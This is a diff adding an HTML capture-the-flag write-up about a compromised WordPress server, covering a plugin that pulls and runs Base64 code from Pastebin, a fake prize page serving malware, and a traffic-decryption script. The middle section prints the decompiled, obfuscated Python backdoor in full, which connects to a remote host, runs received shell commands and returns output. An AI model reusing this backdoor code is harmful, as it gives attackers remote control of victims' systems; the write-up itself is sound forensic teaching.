@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inception Write Up | CTF Writeups</title>
+    <link rel="icon" type="image/png" href="../assets/cursor.png">
+    <link rel="stylesheet" href="../styles/style.css">
+</head>
+<body>
+    <header>
+        <img src="../assets/title.png" alt="d33znu75 diaries">
+    </header>
+    
+    <nav class="nav-section">
+        <a href="../home.html">HOME</a>
+        <a href="../featured.html">FEATURED</a>
+        <a href="../about.html">ABOUT</a>
+    </nav>
+    
+    <div class="container">
+        <a href="../featured.html" class="back-button">← Back</a>
+        
+        <article class="writeup">
+            <h1>Inception Write Up</h1>
+            <div class="writeup-meta">
+                2024-10-20 | <span class="tag">Forensics</span><span class="tag">Malware</span><span class="tag">Reverse Engineering</span>
+            </div>
+            
+            <h1 id="inception-write-up">Inception Write Up</h1>
+<p><img class="lightbox-img" src="../images/odyssey/0.png" alt="" onclick="openLightbox(this)"></p>
+<p>In this challenge, we have two files: a Linux server file system and a Wireshark network capture file.</p>
+<p><img class="lightbox-img" src="../images/odyssey/1.png" alt="" onclick="openLightbox(this)"></p>
+<p>Analyzing the file system, we found the website hosted on this server at /srv/www/. It is a WordPress website.</p>
+<p><img class="lightbox-img" src="../images/odyssey/2.png" alt="" onclick="openLightbox(this)"></p>
+<h3 id="the-first-part-of-the-flag">The first part of the flag</h3>
+<p>In the WordPress files, specifically in the plugins folder (/srv/www/wp-content/plugins), we found two plugins.</p>
+<p><img class="lightbox-img" src="../images/odyssey/3.png" alt="" onclick="openLightbox(this)"></p>
+<p>The plugin-manager contains a single PHP file, which is unusual. In the plugin-manager.php code, we discovered a Pastebin link. </p>
+<p><img class="lightbox-img" src="../images/odyssey/4.png" alt="" onclick="openLightbox(this)"></p>
+<p>Essentially, the script retrieves data from that Pastebin, decodes it from Base64, and executes it.</p>
+<p><img class="lightbox-img" src="../images/odyssey/5.png" alt="" onclick="openLightbox(this)"></p>
+<p>After decoding the Base64 text, we obtained a script (which is a reverse shell script). Within this script, we found a variable ($secpart) that holds the first part of the flag in decimal:</p>
+<p><img class="lightbox-img" src="../images/odyssey/6.png" alt="" onclick="openLightbox(this)"></p>
+<p>"65 75 65 83 69 67 123 55 104 51 95" -&gt; <code>AKASEC{7h3_</code></p>
+<h3 id="the-second-part-of-the-flag">The second part of the flag</h3>
+<p>Now that we have the first part, we still need to find the other two.</p>
+<p>Next, we examined the main folder of WordPress. The index.php file refers us to free_items.php. The website displays the text: "Congrats! You Won a free Arduino! Click On The Image To See More Details," and clicking the image downloads an executable (which is malware).</p>
+<p>Analyzing the website source code, we noticed obfuscated JavaScript. In the array of strings, we found a hex string containing the second part of the flag:</p>
+<p><img class="lightbox-img" src="../images/odyssey/7.png" alt="" onclick="openLightbox(this)"></p>
+<p>"3472375f30665f6326635f" -&gt; <code>4r7_0f_c&amp;c_</code></p>
+<h3 id="the-third-part-of-the-flag">The third part of the flag</h3>
+<p>The JavaScript also contains a Base64 text of the executable, so we retrieved the malware for analysis.</p>
+<h4 id="static-analysis-of-the-malware">Static Analysis of the Malware</h4>
+<p><img class="lightbox-img" src="../images/odyssey/8.png" alt="" onclick="openLightbox(this)"></p>
+<p><img class="lightbox-img" src="../images/odyssey/9.png" alt="" onclick="openLightbox(this)"></p>
+<p>The malware is a PE32+ executable written in Python. To reverse it and see the source code, I used <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor.py</a> to extract the contents of this PyInstaller-generated executable file.</p>
+<p><img class="lightbox-img" src="../images/odyssey/10.png" alt="" onclick="openLightbox(this)"></p>
+<p>Once extracted, we decompiled the main file (client.pyc). It contained obfuscated Python code that establishes a connection to a remote server using port 1337 to receive and execute commands sent by the server. These commands are encrypted using AES and XOR.</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span><span class="p">,</span> <span class="n">algorithms</span><span class="p">,</span> <span class="n">modes</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">padding</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="n">_DW_</span> <span class="o">=</span> <span class="mi">1337</span>
+
+<span class="k">def</span> <span class="nf">_X_X_</span><span class="p">(</span><span class="n">_</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">((</span><span class="nb">chr</span><span class="p">(</span><span class="n">__</span><span class="p">)</span> <span class="k">for</span> <span class="n">__</span> <span class="ow">in</span> <span class="n">_</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">_X_Y_</span><span class="p">(</span><span class="n">_</span><span class="p">):</span>
+    <span class="n">__</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
+    <span class="n">___</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">____</span><span class="p">)</span> <span class="o">^</span> <span class="n">__</span><span class="p">)</span> <span class="k">for</span> <span class="n">____</span> <span class="ow">in</span> <span class="n">_</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">___</span>
+<span class="n">_0x20_</span> <span class="o">=</span> <span class="n">_X_Y_</span><span class="p">(</span><span class="n">_X_X_</span><span class="p">([</span><span class="mi">60</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">63</span><span class="p">]))</span>
+<span class="n">_0x0_</span> <span class="o">=</span> <span class="n">_X_Y_</span><span class="p">(</span><span class="n">_X_X_</span><span class="p">([</span><span class="mi">16</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">70</span><span class="p">]))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">_0x01_</span> <span class="o">=</span> <span class="n">_X_Y_</span><span class="p">(</span><span class="n">_X_X_</span><span class="p">([</span><span class="mi">113</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">32</span><span class="p">]))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">_0x00_</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">_0x00_</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">_0x20_</span><span class="p">,</span> <span class="n">_DW_</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">_234234_</span><span class="p">(</span><span class="n">_</span><span class="p">):</span>
+    <span class="n">__</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
+    <span class="n">___</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">____</span><span class="p">)</span> <span class="o">^</span> <span class="n">__</span><span class="p">)</span> <span class="k">for</span> <span class="n">____</span> <span class="ow">in</span> <span class="n">_</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">___</span>
+
+<span class="k">def</span> <span class="nf">_777_</span><span class="p">(</span><span class="n">_</span><span class="p">):</span>
+    <span class="n">__</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
+    <span class="n">___</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">____</span><span class="p">)</span> <span class="o">^</span> <span class="n">__</span><span class="p">)</span> <span class="k">for</span> <span class="n">____</span> <span class="ow">in</span> <span class="n">_</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">___</span>
+
+<span class="k">def</span> <span class="nf">__</span><span class="p">(</span><span class="n">_0x</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_func</span><span class="p">):</span>
+    <span class="n">_0xPP</span> <span class="o">=</span> <span class="n">padding</span><span class="o">.</span><span class="n">PKCS7</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span><span class="o">.</span><span class="n">padder</span><span class="p">()</span>
+    <span class="n">_0xPD</span> <span class="o">=</span> <span class="n">_0xPP</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">_0x</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">+</span> <span class="n">_0xPP</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+    <span class="n">_0xC</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">AES</span><span class="p">(</span><span class="n">_</span><span class="p">),</span> <span class="n">modes</span><span class="o">.</span><span class="n">CBC</span><span class="p">(</span><span class="n">_func</span><span class="p">),</span> <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
+    <span class="n">_0xE</span> <span class="o">=</span> <span class="n">_0xC</span><span class="o">.</span><span class="n">encryptor</span><span class="p">()</span>
+    <span class="n">_0x555</span> <span class="o">=</span> <span class="n">_0xE</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">_0xPD</span><span class="p">)</span> <span class="o">+</span> <span class="n">_0xE</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">_0x555</span>
+
+<span class="k">def</span> <span class="nf">____</span><span class="p">(</span><span class="n">___</span><span class="p">,</span> <span class="n">_____</span><span class="p">,</span> <span class="n">_</span><span class="p">):</span>
+    <span class="n">_CC</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">AES</span><span class="p">(</span><span class="n">_____</span><span class="p">),</span> <span class="n">modes</span><span class="o">.</span><span class="n">CBC</span><span class="p">(</span><span class="n">_</span><span class="p">),</span> <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
+    <span class="n">_D</span> <span class="o">=</span> <span class="n">_CC</span><span class="o">.</span><span class="n">decryptor</span><span class="p">()</span>
+    <span class="n">_DD</span> <span class="o">=</span> <span class="n">_D</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">___</span><span class="p">)</span> <span class="o">+</span> <span class="n">_D</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+    <span class="n">u</span> <span class="o">=</span> <span class="n">padding</span><span class="o">.</span><span class="n">PKCS7</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span><span class="o">.</span><span class="n">unpadder</span><span class="p">()</span>
+    <span class="n">_DD</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">_DD</span><span class="p">)</span> <span class="o">+</span> <span class="n">u</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">_DD</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">_</span><span class="p">(</span><span class="n">__</span><span class="p">):</span>
+    <span class="n">_</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">___</span> <span class="o">=</span> <span class="n">__</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">___</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">___</span><span class="p">:</span>
+            <span class="k">break</span>
+        <span class="n">_</span> <span class="o">=</span> <span class="n">_</span> <span class="o">+</span> <span class="n">___</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">___</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">:</span>
+            <span class="k">break</span>
+    <span class="k">return</span> <span class="n">_</span>
+
+<span class="k">def</span> <span class="nf">_____</span><span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="n">__</span><span class="p">,</span> <span class="n">___</span><span class="o">=</span><span class="mi">1024</span><span class="p">):</span>
+    <span class="n">____</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">____</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">__</span><span class="p">):</span>
+        <span class="n">_____</span> <span class="o">=</span> <span class="n">_</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">__</span><span class="p">[</span><span class="n">____</span><span class="p">:</span><span class="n">____</span> <span class="o">+</span> <span class="n">___</span><span class="p">])</span>
+        <span class="n">____</span> <span class="o">+=</span> <span class="n">_____</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">___________</span> <span class="o">=</span> <span class="n">_</span><span class="p">(</span><span class="n">_0x00_</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">___________</span><span class="p">)</span>
+        <span class="n">___________</span> <span class="o">=</span> <span class="n">____</span><span class="p">(</span><span class="n">___________</span><span class="p">,</span> <span class="n">_0x0_</span><span class="p">,</span> <span class="n">_0x01_</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">___________</span><span class="p">)</span>
+        <span class="n">___________</span> <span class="o">=</span> <span class="n">_777_</span><span class="p">(</span><span class="n">___________</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">___________</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;received : </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">___________</span><span class="p">))</span>
+        <span class="n">___________</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">___________</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">___________</span><span class="o">.</span><span class="n">returncode</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">___________</span><span class="o">.</span><span class="n">returncode</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">___________</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
+            <span class="n">___________</span> <span class="o">=</span> <span class="n">_234234_</span><span class="p">(</span><span class="n">___________</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
+            <span class="n">___________</span> <span class="o">=</span> <span class="n">__</span><span class="p">(</span><span class="n">___________</span><span class="p">,</span> <span class="n">_0x0_</span><span class="p">,</span> <span class="n">_0x01_</span><span class="p">)</span>
+            <span class="n">_____</span><span class="p">(</span><span class="n">_0x00_</span><span class="p">,</span> <span class="n">___________</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">___________</span> <span class="o">=</span> <span class="n">_234234_</span><span class="p">(</span><span class="n">___________</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+            <span class="n">___________</span> <span class="o">=</span> <span class="n">__</span><span class="p">(</span><span class="n">___________</span><span class="p">,</span> <span class="n">_0x0_</span><span class="p">,</span> <span class="n">_0x01_</span><span class="p">)</span>
+            <span class="n">_0x00_</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">___________</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="n">_0x00_</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;connection closed !!!&#39;</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">()</span>
+</code></pre></div>
+
+<p>After deobfuscating the code, we found the key and IV used for AES encryption:</p>
+<p><code>KEY = b'0123456789abcdef0123456789abcdef'</code>
+<code>IV = b'abcdef9876543210'</code></p>
+<p>Now that we have the network capture file, we can analyze the commands executed on the server.</p>
+<h4 id="analyzing-network-traffic">Analyzing Network Traffic</h4>
+<p>We filtered the TCP protocol by port 1337 and followed the stream. The data in red represents the client commands sent to the server (the victim computer), while the blue data shows the output of those commands.</p>
+<p><img class="lightbox-img" src="../images/odyssey/11.png" alt="" onclick="openLightbox(this)"></p>
+<p>Next, we needed to change the output of the packets from ASCII to RAW.</p>
+<p><img class="lightbox-img" src="../images/odyssey/12.png" alt="" onclick="openLightbox(this)"></p>
+<p>This is the Python script I created to decrypt the traffic based on the script that encrypted them.</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span><span class="p">,</span> <span class="n">algorithms</span><span class="p">,</span> <span class="n">modes</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">padding</span>
+
+<span class="n">KEY</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;0123456789abcdef0123456789abcdef&#39;</span>
+<span class="n">IV</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;abcdef9876543210&#39;</span>
+
+<span class="k">def</span> <span class="nf">decrypt_xor</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">length</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">result</span>
+
+<span class="k">def</span> <span class="nf">to_decrypt</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
+    <span class="n">CC</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">AES</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">modes</span><span class="o">.</span><span class="n">CBC</span><span class="p">(</span><span class="n">iv</span><span class="p">),</span> <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
+    <span class="n">D</span> <span class="o">=</span> <span class="n">CC</span><span class="o">.</span><span class="n">decryptor</span><span class="p">()</span>
+    <span class="n">DD</span> <span class="o">=</span> <span class="n">D</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="n">D</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+    <span class="n">u</span> <span class="o">=</span> <span class="n">padding</span><span class="o">.</span><span class="n">PKCS7</span><span class="p">(</span><span class="n">algorithms</span><span class="o">.</span><span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span><span class="o">.</span><span class="n">unpadder</span><span class="p">()</span>
+    <span class="n">DD</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">DD</span><span class="p">)</span> <span class="o">+</span> <span class="n">u</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">DD</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+
+<span class="n">a</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="c1"># here put the RAW data</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">to_decrypt</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">IV</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">decrypt_xor</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</code></pre></div>
+
+<p>When decrypting the traffic, we found that one of the commands sent to the server contained the last part of the flag.</p>
+<p><img class="lightbox-img" src="../images/odyssey/13.png" alt="" onclick="openLightbox(this)"></p>
+<p>Flag : <code>AKASEC{7h3_4r7_0f_c&amp;c_15_m1nd_bl0w1n6}</code></p>
+<h3 id="conclusion">Conclusion</h3>
+<p>In conclusion, this challenge was good. I enjoyed it, even though I spent a significant amount of time finding the first part that was hidden in the plugin.</p>
+        </article>
+    </div>
+    
+    <!-- Lightbox Modal -->
+    <div id="lightbox" class="lightbox">
+        <span class="lightbox-close" onclick="closeLightbox()">&times;</span>
+        <img class="lightbox-content" id="lightbox-img" src="" alt="">
+    </div>
+    
+    <script>
+    function openLightbox(imgElement) {
+        const lightbox = document.getElementById('lightbox');
+        const lightboxImg = document.getElementById('lightbox-img');
+        
+        lightboxImg.src = imgElement.src;
+        lightbox.classList.add('active');
+        document.body.style.overflow = 'hidden';
+    }
+    
+    function closeLightbox() {
+        const lightbox = document.getElementById('lightbox');
+        lightbox.classList.remove('active');
+        document.body.style.overflow = 'auto';
+    }
+    
+    // Close lightbox when clicking outside the image
+    document.addEventListener('DOMContentLoaded', function() {
+        const lightbox = document.getElementById('lightbox');
+        lightbox.addEventListener('click', function(event) {
+            if (event.target === lightbox) {
+                closeLightbox();
+            }
+        });
+    });
+    
+    // Close lightbox with Escape key
+    document.addEventListener('keydown', function(event) {
+        if (event.key === 'Escape') {
+            closeLightbox();
+        }
+    });
+    </script>
+</body>
+</html>
